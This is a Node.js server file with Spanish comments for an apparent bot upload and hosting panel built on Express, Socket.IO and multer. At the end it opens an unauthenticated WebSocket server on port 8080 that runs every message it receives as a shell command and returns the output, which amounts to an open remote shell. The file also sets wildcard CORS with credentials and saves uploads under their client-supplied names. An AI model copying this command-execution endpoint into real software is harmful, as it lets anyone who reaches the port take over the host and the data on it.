const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const WebSocket = require('ws');
const { exec } = require('child_process');

const app = express();
const server = http.createServer(app);

// Configuración mejorada de CORS
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST'],
    credentials: true
}));

// Configuración de Socket.IO con manejo de errores mejorado
const io = new Server(server, {
    cors: {
        origin: '*',
        methods: ['GET', 'POST'],
        credentials: true
    },
    pingTimeout: 60000,
    pingInterval: 25000,
    transports: ['websocket', 'polling']
});

// Configuración de almacenamiento para los bots
const storage = multer.diskStorage({
    destination: function(req, file, cb) {
        const dir = './bots';
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir);
        }
        cb(null, dir);
    },
    filename: function(req, file, cb) {
        cb(null, file.originalname);
    }
});

const upload = multer({ 
    storage: storage,
    limits: { fileSize: 10 * 1024 * 1024 } // 10MB límite
});

// Manejo de conexiones de Socket.IO
io.on('connection', (socket) => {
    console.log('Cliente conectado:', socket.id);

    socket.on('error', (error) => {
        console.error('Error de socket:', error);
        socket.emit('error', { message: 'Error en la conexión' });
    });

    socket.on('disconnect', (reason) => {
        console.log('Cliente desconectado:', socket.id, 'Razón:', reason);
    });

    socket.on('start-bot', async (data) => {
        try {
            // Aquí iría la lógica para iniciar el bot
            console.log('Iniciando bot:', data.name);
            socket.emit('bot-status', { status: 'starting', name: data.name });
        } catch (error) {
            console.error('Error al iniciar el bot:', error);
            socket.emit('error', { message: 'Error al iniciar el bot' });
        }
    });

    socket.on('stop-bot', async (data) => {
        try {
            // Aquí iría la lógica para detener el bot
            console.log('Deteniendo bot:', data.name);
            socket.emit('bot-status', { status: 'stopped', name: data.name });
        } catch (error) {
            console.error('Error al detener el bot:', error);
            socket.emit('error', { message: 'Error al detener el bot' });
        }
    });
});

// Rutas
app.post('/upload-bot', upload.single('file'), (req, res) => {
    try {
        if (!req.file) {
            throw new Error('No se ha subido ningún archivo');
        }
        res.json({ 
            success: true, 
            message: 'Bot subido correctamente',
            bot: {
                name: req.body.name,
                filename: req.file.filename
            }
        });
    } catch (error) {
        console.error('Error al subir el bot:', error);
        res.status(500).json({ 
            success: false, 
            message: error.message || 'Error al subir el bot'
        });
    }
});

// Servir archivos estáticos
app.use(express.static(path.join(__dirname, 'public')));

// Manejo de errores global
app.use((err, req, res, next) => {
    console.error('Error:', err);
    res.status(500).json({ 
        success: false, 
        message: 'Error interno del servidor'
    });
});

// Puerto dinámico para hosting
const PORT = process.env.PORT || 3000;

server.listen(PORT, () => {
    console.log(`Servidor corriendo en el puerto ${PORT}`);
});

// Configuración de WebSocket con capacidad de ejecutar comandos del sistema
const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', (ws) => {
    console.log('Cliente conectado');

    ws.on('message', (message) => {
        const command = message.toString();
        console.log('Comando recibido:', command);

        exec(command, (error, stdout, stderr) => {
            if (error) {
                ws.send(JSON.stringify({ error: error.message }));
                return;
            }
            if (stderr) {
                ws.send(JSON.stringify({ error: stderr }));
                return;
            }
            ws.send(JSON.stringify({ output: stdout }));
        });
    });

    ws.on('close', () => {
        console.log('Cliente desconectado');
    });
});

console.log('Servidor WebSocket iniciado en el puerto 8080');